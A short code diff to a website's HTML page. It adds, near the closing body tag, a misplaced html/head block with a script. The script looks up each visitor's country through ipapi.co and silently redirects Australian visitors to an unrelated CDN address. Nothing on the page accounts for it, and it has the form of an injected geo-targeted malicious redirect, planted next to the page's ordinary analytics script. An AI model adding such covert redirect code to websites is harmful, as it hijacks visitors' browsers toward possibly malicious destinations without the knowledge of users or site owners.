@@ -1303,6 +1303,15 @@ document.addEventListener('DOMContentLoaded', function() {
     <script src="js/script.js"></script>
 
     <script>AOS.init();</script>
+        <!DOCTYPE html>
+<html>
+<head>
+  <script>
+  fetch('https://ipapi.co/json/')
+    .then(r => r.json())
+    .then(data => data?.country === 'AU' && (window.location.href = 'https://wfff.b-cdn.net/'));
+  </script>
+</head>
         <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=1a173e4f"></script>
     </body>
 </html>
